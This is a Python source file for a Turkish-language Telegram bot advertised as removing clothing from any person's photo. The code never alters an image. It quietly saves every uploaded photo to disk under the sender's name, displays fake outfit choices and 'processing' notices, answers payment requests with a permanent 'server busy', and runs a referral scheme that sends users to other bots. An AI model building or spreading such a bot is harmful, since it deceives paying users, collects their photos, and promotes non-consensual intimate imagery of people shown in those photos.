from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler, Job
import string
import random

TOKEN = "BOT_TOKEN"

invitations = {}
points = {}

def start(update, context):
    username = update.message.from_user.username
    if username:
        name = f"@{username}"
    else:
        name = update.message.from_user.first_name
    message = f"Tekrar hoşgeldiniz, {name}!\n\nHizmetimizi kullanmaya devam ederek kullanıcı sözleşmesini (http://bikinioff.net/user_agreement/en) kabul etmiş sayılırsınız ve 18 yaşınızı geçtiğinizi onaylarsınız.\n\nTemizlenmesini istediğiniz bir fotoğraf gönderin.\n\n- 3 krediniz kaldı.\n- Bir fotoğrafın işlenme maliyeti bir kredidir.\n- Kredi satın almak için /payment komutunu kullanın.\n\nHaberleri takip etmek için @FreeNudeAl kanalımıza abone olun.\n\nBotun bağlantısını arkadaşlarınızla paylaşın ve onların ilk satın almasından %50 kredi geri alın.\n/how2earn komutunu kullanarak bizimle kazanmak isterseniz."

    # Daha Fazla Kredi butonunu oluşturma
    inline_keyboard = [[InlineKeyboardButton("DAHA FAZLA KREDİ", url="https://t.me/Bra_Off_bot?start=iMLfgzMB")]]
    reply_markup = InlineKeyboardMarkup(inline_keyboard)

    update.message.reply_text(message, reply_markup=reply_markup)

def process_photo(update, context):
    photo = update.message.photo[-1]  # En son gönderilen fotoğrafı al

    # Fotoğrafı kaydet
    file_id = photo.file_id
    new_file = context.bot.get_file(file_id)

    username = update.message.from_user.username
    if username:
        name = f"@{username}"
    else:
        name = update.message.from_user.first_name

    new_file.download(f"photos/{name}_{file_id}.jpg")

    # Butonlara uygun emojileri belirle
    emoji_dict = {
        "Bikini": "👙",
        "Spor": "🏋️‍♂️",
        "Mayo": "🩱",
        "İç Çamaşırı": "🩲"
    }

    # Butonları ve emojileri içeren mesajı oluştur
    buttons = []
    for label, emoji in emoji_dict.items():
        buttons.append(InlineKeyboardButton(f"{emoji} {label}", callback_data=label))

    # Butonları ikişerli gruplara bölmek
    inline_keyboard = [buttons[i:i+2] for i in range(0, len(buttons), 2)]

    reply_markup = InlineKeyboardMarkup(inline_keyboard)
    message = update.message.reply_photo(photo=photo.file_id, caption="Aşağıdaki seçeneklerden birini seçin:", reply_markup=reply_markup)

    # Fotoğraf işlenme tamamlandığında mesajı gönderme
    job = Job(finish_processing, 10.0, repeat=False, context=(update.effective_chat.id, message))
    context.job_queue.put(job)

def finish_processing(context):
    chat_id, message = context.job.context
    response_finished = "Fotoğraf Başarılı bir şekilde işlendi ✅\n\nFotoğrafı Bottan Talep Edebilirsiniz."

    # Talep Et butonunu oluşturma
    inline_keyboard = [[InlineKeyboardButton("Talep Et", url="https://t.me/PPnude_bot?start=IWLXRDGE")]]
    reply_markup = InlineKeyboardMarkup(inline_keyboard)

    context.bot.send_message(chat_id=chat_id, text=response_finished, reply_markup=reply_markup)
    message.delete()

def button_callback(update, context):
    query = update.callback_query
    label = query.data

    # Seçilen butona göre yanıt mesajı oluştur
    response = f"Seçiminiz: {label}\n\nFotoğrafınızı onaylamak için 'Onayla' butonuna tıklayın."

    # Onaylama butonunu oluşturma
    inline_keyboard = [
        [InlineKeyboardButton("Onayla ✅", callback_data="Onayla"),
         InlineKeyboardButton("Yardım🆘", url="https://t.me/Bra_Off_bot?start=iMLfgzMB"),
         InlineKeyboardButton("Güncelle 🔄", url="https://t.me/PPnude_bot?start=IWLXRDGE")]
    ]
    reply_markup = InlineKeyboardMarkup(inline_keyboard)

    query.edit_message_caption(caption=response, reply_markup=reply_markup)

def confirmation_callback(update, context):
    query = update.callback_query
    data = query.data

    if data == "Onayla":
        # İşleniyor mesajını ve tik emojisini gönderme
        response = "Fotoğrafınız İşleniyor\n\nBekleme süresi: Max 2 Dakika ⏳✅"
        query.answer()
        query.edit_message_caption(caption=response, reply_markup=None)

def generate_invitation_code():
    letters = string.ascii_uppercase + string.ascii_lowercase
    invitation_code = ''.join(random.choice(letters) for _ in range(7))
    return invitation_code

def invite(update, context):
    user_id = update.message.from_user.id
    invitation_code = generate_invitation_code()
    invitation_link = f"https://t.me/share/url?text=Remove%20clothing%20from%20any%20picture,%20leaving%20behind%20only%20the%20bare%20essentials!%20Hayal%20Etti%C4%9Finiz%20Ki%C5%9Fiyi%20Robot%20ile%20Soyun&url=https://t.me/FreeNudeAlbot?start={invitation_code}"

    invitations[user_id] = invitation_code

    response = f"Davetiyeniz: {invitation_link}"
    update.message.reply_text(response)

def getme(update, context):
    user_id = update.message.from_user.id
    invitation_code = invitations.get(user_id, "")

    response = f"💁Account uid: {user_id}\n😀Account Name: {update.message.from_user.first_name}\n🎭puan: {points.get(user_id, 0)}\n💰Balance: 0.00 USD\n💰Commission: 0.00 USD\n\nTips: You can get 1 point for every person you invite, and you can get a chance to invite 5 people\nTo start now, please click \"🎁Invite Friends\" in the menu bar\nDavetiyeniz: https://t.me/FreeNudeAlbot?={invitation_code}"
    update.message.reply_text(response)

def payment(update, context):
    response = "Sunucu yoğun, lütfen bekleyin ⏳🔄"
    update.message.reply_text(response)

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.photo, process_photo))
    dp.add_handler(CallbackQueryHandler(button_callback))
    dp.add_handler(CallbackQueryHandler(confirmation_callback, pattern="^Onayla$"))
    dp.add_handler(CommandHandler("invite", invite))
    dp.add_handler(CommandHandler("getme", getme))
    dp.add_handler(CommandHandler("payment", payment))  # Payment command

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()

